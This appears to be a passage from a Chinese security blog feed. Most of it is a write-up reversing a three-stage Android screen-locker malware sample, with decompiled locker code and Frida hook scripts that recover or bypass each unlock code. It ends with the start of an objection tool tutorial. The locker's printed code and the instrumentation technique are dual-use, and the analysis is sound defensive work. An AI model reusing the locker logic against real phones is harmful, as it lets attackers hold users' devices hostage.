&quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;&#125;;</span><br><span class="line">    String[] v5 &#x3D; &#123;&quot;嘻&quot;, &quot;❥&quot;, &quot;÷&quot;, &quot;∷&quot;, &quot;●&quot;, &quot;©&quot;, &quot;额&quot;, &quot;★&quot;, &quot;※&quot;, &quot;&#x2F;&quot;&#125;;</span><br><span class="line">    int v6;</span><br><span class="line">    for(v6 &#x3D; 0; v6 &lt; 10; ++v6) &#123;</span><br><span class="line">        if(v6 &#x3D;&#x3D; 0) &#123;</span><br><span class="line">            v3_1 &#x3D; v2.toString().replace(v4[v6], v5[v6]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        v3_1 &#x3D; v3_1.replace(v4[v6], v5[v6]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return v3_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在sm()方法中拿到生成识别码的逻辑，跟进去原来是随机四位数做了火星文对应，在100000002构造函数中<code>this.val$诗梦 = arg17;</code>就是随机四位数v11 ^ 1288，，所以才显示在前台页面是火星文，那么我们可以<strong>通过hook颜如玉QQ2693533893.get()拿到四位数对应的该火星文</strong>，也可以直接根据V4 V5对应表来找到该火星文。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int v11 &#x3D; (int)(Math.random() * 4.879400E-320);</span><br><span class="line">v4.setText(&quot;你的识别码&#x3D;&quot; + 颜如玉QQ2693533893.get(&quot;&quot; + v11));</span><br><span class="line">颜如玉QQ2693533893.te(&quot;sdcard&quot;);</span><br><span class="line">USBLock v13 &#x3D; new USBLock();</span><br><span class="line">new Timer().schedule(v13, new Date(), 1000L);</span><br><span class="line">v3.setOnClickListener(new 100000002(this, v5, v11 ^ 0x508, v6, v3, v4, v7, v8, v9, v10));</span><br></pre></td></tr></table></figure><p>可以根据get方法中对应的信息进行定位。</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129103815123.png" alt="image-20230129103815123" div align="center"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String[] v4 &#x3D; &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;&#125;;</span><br><span class="line">String[] v5 &#x3D; &#123;&quot;嘻&quot;, &quot;❥&quot;, &quot;÷&quot;, &quot;∷&quot;, &quot;●&quot;, &quot;©&quot;, &quot;额&quot;, &quot;★&quot;, &quot;※&quot;, &quot;&#x2F;&quot;&#125;;</span><br><span class="line">6190</span><br></pre></td></tr></table></figure><p>接着分析onClick方法可知随机四位数被作为参数给了getSaltMD5,那么我们可以<strong>通过反射和四位数拿到v3的值。</strong></p><p>hook.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line"></span><br><span class="line">        for(var i&#x3D;999;i&lt;10000;i++)&#123;</span><br><span class="line">            var i &#x3D; javaString.$new(String(i));</span><br><span class="line">            var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">            var v3 &#x3D; Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5((javaString.$new(String(i^1288)))));</span><br><span class="line">            var v3 &#x3D; javaString.$new(final_last9).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">            console.log(&quot;i,Code,v3:&quot;,i,Code,v3);</span><br><span class="line">            if (Code &#x3D;&#x3D; &quot;额❥&#x2F;嘻&quot;)&#123; &#x2F;&#x2F; 5147</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">i,Code,v3: 6179 额❥★&#x2F; 5930115214632905764947</span><br><span class="line">i,Code,v3: 6180 额❥※嘻 107899719181495393421953265</span><br><span class="line">i,Code,v3: 6181 额❥※❥ 637925064710567273601450494</span><br><span class="line">i,Code,v3: 6182 额❥※÷ 79031009396005431455865545</span><br><span class="line">i,Code,v3: 6183 额❥※∷ 927545851918403937793285270</span><br><span class="line">i,Code,v3: 6184 额❥※● 1520178882327296987108</span><br><span class="line">i,Code,v3: 6185 额❥※© 37660404572152154889</span><br><span class="line">i,Code,v3: 6186 额❥※额 5153164879398001979082044</span><br><span class="line">i,Code,v3: 6187 额❥※★ 7549072384256789855633</span><br><span class="line">i,Code,v3: 6188 额❥※※ 04993536950983416668988739</span><br><span class="line">i,Code,v3: 6189 额❥※&#x2F; 4503222936237929487161634306</span><br><span class="line">i,Code,v3: 6190 额❥&#x2F;嘻 91852619857657324187556049</span><br></pre></td></tr></table></figure><p>接着我们分析判断的语句。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">颜如玉QQ2693533893.getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9))</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;step1</span><br><span class="line">getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) + v2.substring(3, v2.length()) &#x3D;</span><br><span class="line">&quot;9DDEB743E935CE399F1DFAF080775366&quot; + v3.substring(0, 9)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;step2</span><br><span class="line">getSaltMD5(MyServiceOne.颜如玉(v2.substring(0, 3))) &#x3D; &quot;9DDEB743E935CE399F1DFAF080775366&quot;</span><br><span class="line">v2.substring(3, v2.length()  &#x3D;  v3.substring(0, 9)</span><br></pre></td></tr></table></figure><p>hook1.js如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5(Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(j));</span><br><span class="line">            &#x2F;&#x2F; console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;9DDEB743E935CE399F1DFAF080775366&#39;)&#123;</span><br><span class="line">            console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; v2_3: 358</span><br></pre></td></tr></table></figure><p>重新打开应用</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129111427733.png" alt="image-20230129111427733" div align="center"><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Code 7363</span><br></pre></td></tr></table></figure><p>Hook1.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5(Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(j));</span><br><span class="line">            &#x2F;&#x2F; console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;9DDEB743E935CE399F1DFAF080775366&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            var i &#x3D; javaString.$new(String(3744));</span><br><span class="line">            var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">            var v3 &#x3D; Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5((javaString.$new(String(i^1288)))));</span><br><span class="line">            var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">            var resu1 &#x3D; &quot;358&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">            console.log(&quot;i,Code,v3,resu1:&quot;,i,Code, v3, resu1);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果为<strong>358230734399</strong>,输入进入第二层。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.shimeng.qq2693533893]-&gt; Find_Code()</span><br><span class="line">v2_3: 358</span><br><span class="line">i,Code,v3,resu1: 7363 ★∷额∷ 2307343997321858474745697 358230734399</span><br></pre></td></tr></table></figure><h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129123216805.png" alt="image-20230129123216805"></p><p>整体逻辑和第一层一样，首先来看sm2函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">    this.util &#x3D; new FloatViewUtil(this);</span><br><span class="line">    this.v &#x3D; LayoutInflater.from(this).inflate(0x7F030001, null);  &#x2F;&#x2F; layout:MT_Bin</span><br><span class="line">    this.util.setview(this.v);</span><br><span class="line">    this.util.createfloatview(-1, 0x500);</span><br><span class="line">    Button v1 &#x3D; (Button)this.util.byid(0x7F070006);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    TextView v2 &#x3D; (TextView)this.util.byid(0x7F070004);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    EditText v3 &#x3D; (EditText)this.util.byid(0x7F070005);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    int v4 &#x3D; (int)(Math.random() * 4.940600E-319);</span><br><span class="line">    v2.setText(&quot;你的识别码&#x3D;&quot; + 颜如玉QQ2693533893.get(&quot;&quot; + v4));</span><br><span class="line">    v1.setOnClickListener(new 100000003(this, v3, v4));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体逻辑和sm1一样不过识别码变成了5位，关键代码如下。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(v2.length() &gt;&#x3D; 3) &#123;</span><br><span class="line">                String v3 &#x3D; 颜如玉QQ2693533893.hex_sha1(MyServiceOne.破解死妈.getTwiceMD5ofString(&quot;&quot; + this.val$u2)).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">                </span><br><span class="line">                if(v3.length() &gt; 9 &amp;&amp; v3.length() &gt; 3 &amp;&amp; (MyServiceOne.破解死妈.getTwiceMD5ofString(颜如玉QQ2693533893.hex_sha1(v2.substring(0, 3))) + v2.substring(3, v2.length()).equals(&quot;8D4FF507DCDA63C201EB8B99D4170900&quot; + v3.substring(0, 9)))) &#123;</span><br><span class="line">                    MyServiceOne.this.util.removeView();</span><br><span class="line">                    MyServiceOne.this.诗梦();</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>根据第一层的规则直接编写脚本如下</p><p>hook2.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(j));</span><br><span class="line">            &#x2F;&#x2F;console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;8D4FF507DCDA63C201EB8B99D4170900&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        var i &#x3D; javaString.$new(String(44207));</span><br><span class="line">        var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">        var v3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(i));</span><br><span class="line">        var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">        var resu2 &#x3D; &quot;694&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">        console.log(&quot;i,Code,v3,resu2&quot;,i,Code,v3,resu2)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.shimeng.qq2693533893]-&gt; Find_Code()</span><br><span class="line">v2_3: 694</span><br><span class="line">i,Code,v3,resu1 44207 ●●÷嘻★ 98869461037719278110486 694988694610</span><br></pre></td></tr></table></figure><h3 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129123346260.png" alt="image-20230129123346260"></p><p>看关键代码，主要逻辑是访问一个网站获取密码，然后与输入的内容进行对比。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void 诗梦() &#123;</span><br><span class="line">    this.util &#x3D; new FloatViewUtil(this);</span><br><span class="line">    this.v &#x3D; LayoutInflater.from(this).inflate(0x7F030000, null);  &#x2F;&#x2F; layout:MT_Bin</span><br><span class="line">    this.util.setview(this.v);</span><br><span class="line">    this.util.createfloatview(-1, 0x500);</span><br><span class="line">    Button v1 &#x3D; (Button)this.util.byid(0x7F070001);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    EditText v2 &#x3D; (EditText)this.util.byid(0x7F070000);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    this.解锁 &#x3D; (TextView)this.util.byid(0x7F070002);  &#x2F;&#x2F; id:MT_Bin</span><br><span class="line">    v1.setOnClickListener(new 100000006(this, v2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class 100000006 implements View.OnClickListener &#123;</span><br><span class="line">    class 100000004 implements Runnable &#123;</span><br><span class="line">        private final 100000006 this$0;</span><br><span class="line"></span><br><span class="line">        static 100000006 access$0(100000004 arg4) &#123;</span><br><span class="line">            return 100000006.this;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @Override</span><br><span class="line">        public void run() &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                String v1 &#x3D; 100000006.access$0(100000006.this).独自走在孤独的雨中(&quot;https:&#x2F;&#x2F;www.lanzous.com&#x2F;b819183&quot;);</span><br><span class="line">                100000006.access$0(100000006.this).坐等前往世界的尽头的小船 &#x3D; v1.substring(v1.indexOf(&quot;【&quot;), v1.indexOf(&quot;】&quot;)).replace(&quot;【&quot;, &quot;&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            catch(Exception v3) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">        public void onClick(View arg12) &#123;</span><br><span class="line">        new Thread(new 100000004(this)).start();</span><br><span class="line">        if(&quot;187724addd757b99a9dc1eb570c65f32c33f5941&quot;.equals(MyServiceOne.this.坐等前往世界的尽头的小船)) &#123;</span><br><span class="line">            MyServiceOne.this.util.removeView();</span><br><span class="line">            new Timer().schedule(new 100000005(this), 1500L);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(颜如玉QQ2693533893.hex_sha1(this.val$fuck.getText().toString()).equals(MyServiceOne.this.坐等前往世界的尽头的小船)) &#123;</span><br><span class="line">            MyServiceOne.this.util.removeView();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        MyServiceOne.this.解锁.setVisibility(0);</span><br><span class="line">        MyServiceOne.this.解锁.setText(&quot;密码错误，手机恢复正常失败&#x2F;nManifest-Version: 1.0Created-By: 1.0 (Android SignApk)&quot;);</span><br><span class="line">        Runnable v6 &#x3D; MyServiceOne.this.runn3;</span><br><span class="line">        MyServiceOne.this.hand3.postDelayed(v6, 2000L);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>网盘链接已经失效，我们编写脚本给内存中变量<code>v0.this$0.坐等前往世界的尽头的小船</code>赋值即可解锁。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function Find_Code()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;Inside java perform&quot;);</span><br><span class="line">        var val &#x3D; &quot;123123&quot;;</span><br><span class="line">        var string_class &#x3D; Java.use(&quot;java.lang.String&quot;);</span><br><span class="line">        var flag &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(string_class.$new(val));</span><br><span class="line">        Java.choose(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.坐等前往世界的尽头的小船.value &#x3D; flag;</span><br><span class="line">            &#125;,onComplete:function()&#123;console.log(&quot;flag,value&quot;,flag,val);&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Android Emulator 5554::com.shimeng.qq2693533893]-&gt; Find_Code3()</span><br><span class="line">Inside java perform</span><br><span class="line">flag,value 601f1889667efaebb33b8c12572835da3f027f78 123123</span><br></pre></td></tr></table></figure><p>输入<code>123123</code> 即可解锁</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230129125736432.png" alt="image-20230129125736432"></p><p>完整脚本</p><p>hook.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; String[] v4 &#x3D; &#123;&quot;0&quot;, &quot;1&quot;, &quot;2&quot;, &quot;3&quot;, &quot;4&quot;, &quot;5&quot;, &quot;6&quot;, &quot;7&quot;, &quot;8&quot;, &quot;9&quot;&#125;;</span><br><span class="line">&#x2F;&#x2F; String[] v5 &#x3D; &#123;&quot;嘻&quot;, &quot;❥&quot;, &quot;÷&quot;, &quot;∷&quot;, &quot;●&quot;, &quot;©&quot;, &quot;额&quot;, &quot;★&quot;, &quot;※&quot;, &quot;&#x2F;&quot;&#125;;</span><br><span class="line">function Find_Code1()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5(Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(j));</span><br><span class="line">            &#x2F;&#x2F; console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;9DDEB743E935CE399F1DFAF080775366&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            var i &#x3D; javaString.$new(String(3744));</span><br><span class="line">            var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">            var v3 &#x3D; Java.use(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;).颜如玉(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).getSaltMD5((javaString.$new(String(i^1288)))));</span><br><span class="line">            var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">            var resu1 &#x3D; &quot;358&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">            console.log(&quot;i,Code,v3,resu1:&quot;,i,Code, v3, resu1);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">function Find_Code2()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var javaString &#x3D; Java.use(&#39;java.lang.String&#39;)</span><br><span class="line">        for(var j&#x3D;1;j&lt;1000;j++)&#123;</span><br><span class="line">            var j &#x3D; javaString.$new(String(j));</span><br><span class="line">            var v2_3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(j));</span><br><span class="line">            &#x2F;&#x2F;console.log(&quot;l, v2_3:&quot;,j,v2_3);</span><br><span class="line">            if(v2_3 &#x3D;&#x3D; &#39;8D4FF507DCDA63C201EB8B99D4170900&#39;)&#123;</span><br><span class="line">                console.log(&quot;v2_3:&quot;,j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        var i &#x3D; javaString.$new(String(694));</span><br><span class="line">        var Code &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).get(i);</span><br><span class="line">        var v3 &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).$new().getTwiceMD5ofString(i));</span><br><span class="line">        var v3 &#x3D; javaString.$new(v3).replaceAll(&quot;\\D+&quot;, &quot;&quot;);</span><br><span class="line">        var resu2 &#x3D; &quot;694&quot; + javaString.$new(v3).substring(0, 9);</span><br><span class="line">        console.log(&quot;i,Code,v3,resu2&quot;,i,Code,v3,resu2)</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">function Find_Code3()&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        console.log(&quot;Inside java perform&quot;);</span><br><span class="line">        var val &#x3D; &quot;123123&quot;;</span><br><span class="line">        var string_class &#x3D; Java.use(&quot;java.lang.String&quot;);</span><br><span class="line">        var flag &#x3D; Java.use(&quot;com.shimeng.颜如玉.颜如玉QQ2693533893&quot;).hex_sha1(string_class.$new(val));</span><br><span class="line">        Java.choose(&quot;com.shimeng.qq2693533893.MyServiceOne&quot;,&#123;</span><br><span class="line">            onMatch:function(instance)&#123;</span><br><span class="line">                instance.坐等前往世界的尽头的小船.value &#x3D; flag;</span><br><span class="line">            &#125;,onComplete:function()&#123;console.log(&quot;flag,value&quot;,flag,val);&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上篇，上篇对Objection的常用使用方法进行了总结，同时也找到两个APK进行练习测试。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;文章中使用的APK以及脚本可以在此处进行下载 &lt;a href=&quot;https://github.com/OL4THREE/Practice-Note&quot;&gt;Demo下载&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png&quot; alt=&quot;objection.png&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="objection" scheme="http://www.ol4three.com/tags/objection/"/>
    
      <category term="junior" scheme="http://www.ol4three.com/tags/junior/"/>
    
  </entry>
  
  <entry>
    <title>objection 使用详解</title>
    <link href="http://www.ol4three.com/2022/03/11/Android/objection-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/"/>
    <id>http://www.ol4three.com/2022/03/11/Android/objection-%E4%BD%BF%E7%94%A8%E8%AF%A6%E8%A7%A3/</id>
    <published>2022-03-11T08:46:22.000Z</published>
    <updated>2023-01-29T06:17:32.733Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>objection是一个基于Frida的动态的移动测试工具包，可以帮助我们来进行应用程序安全评估。</p><p>主要由以下三个组件组成</p><p>1.Frida-Gadget，以嵌入式模式运行应用，通过objection自己的api方法去调用frda执行我们想要的命令</p><p>2.objeciton本身是由python编写的可以通过python实现一个交互式shell进行命令的加载和使用，以此来调用objection</p><p>3.objection进行hook时会通过TypeScript独立生成一个agent.js文件，这样可以在使用中可以去直接调用所有的功能</p></blockquote><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/objection-20220704171740596.png" alt="objection.png"></p><a id="more"></a><p>首先挂一张图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20220715164700277.png" alt="image-20220715164700277"></p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 推荐兼容下载也可自行选择</span><br><span class="line">pip3 install frida&#x3D;&#x3D;5.3.0</span><br><span class="line">pip3 install frida&#x3D;&#x3D;12.8.0</span><br><span class="line">pip3 install objection&#x3D;&#x3D;1.8.4</span><br><span class="line"># 下载最新版本</span><br><span class="line">pip3 install --upgrade objection</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 测试环境</span><br><span class="line">Mac OS 12.3</span><br><span class="line">Kali 2022</span><br><span class="line">Nexus 6P</span><br><span class="line">MUMU模拟器</span><br></pre></td></tr></table></figure><h2 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h2><h3 id="查看环境任务"><a href="#查看环境任务" class="headerlink" title="查看环境任务"></a>查看环境任务</h3><h4 id="jobs"><a href="#jobs" class="headerlink" title="jobs"></a>jobs</h4><p>用于查看和管理当前Hook所执行的任务，可以同时运行多项hook作业。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # jobs list</span><br><span class="line">Job ID       Hooks  Type</span><br><span class="line">-----------  -----  ------------------------------------</span><br><span class="line">5tk3e403t35      4  watch-method for: java.io.File.$init</span><br></pre></td></tr></table></figure><h4 id="Frida命令"><a href="#Frida命令" class="headerlink" title="Frida命令"></a>Frida命令</h4><p>查看Frida相关信息</p><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="列出内存中的所有类"><a href="#列出内存中的所有类" class="headerlink" title="列出内存中的所有类"></a>列出内存中的所有类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking list classes</span><br></pre></td></tr></table></figure><h3 id="内存中所有已加载的类中搜索包含关键词的类"><a href="#内存中所有已加载的类中搜索包含关键词的类" class="headerlink" title="内存中所有已加载的类中搜索包含关键词的类"></a>内存中所有已加载的类中搜索包含关键词的类</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">android hooking search classes</span><br><span class="line">eg: android hooking search classes display</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">com.android.settings on (google: 6.0.1) [usb] # android hooking search classes display</span><br><span class="line">[Landroid.icu.text.DisplayContext$Type;</span><br><span class="line">[Landroid.icu.text.DisplayContext;</span><br><span class="line">[Landroid.view.Display$ColorTransform;</span><br><span class="line">[Landroid.view.Display$Mode;</span><br><span class="line">android.hardware.display.DisplayManager</span><br><span class="line">android.hardware.display.DisplayManager$DisplayListener</span><br><span class="line">android.hardware.display.DisplayManagerGlobal</span><br><span class="line">android.hardware.display.DisplayManagerGlobal$DisplayListenerDelegate</span><br><span class="line">android.hardware.display.DisplayManagerGlobal$DisplayManagerCallback</span><br><span class="line">android.hardware.display.IDisplayManager</span><br><span class="line">android.hardware.display.IDisplayManager$Stub</span><br><span class="line">android.hardware.display.IDisplayManager$Stub$Proxy</span><br><span class="line">android.hardware.display.IDisplayManagerCallback</span><br><span class="line">android.hardware.display.IDisplayManagerCallback$Stub</span><br><span class="line">android.icu.impl.CurrencyData$CurrencyDisplayInfo</span><br><span class="line">android.icu.impl.CurrencyData$CurrencyDisplayInfoProvider</span><br><span class="line">android.icu.impl.ICUCurrencyDisplayInfoProvider</span><br><span class="line">android.icu.impl.ICUCurrencyDisplayInfoProvider$ICUCurrencyDisplayInfo</span><br><span class="line">android.icu.text.CurrencyDisplayNames</span><br><span class="line">android.icu.text.DisplayContext</span><br><span class="line">android.icu.text.DisplayContext$Type</span><br><span class="line">android.media.RemoteDisplay</span><br><span class="line">android.opengl.EGLDisplay</span><br><span 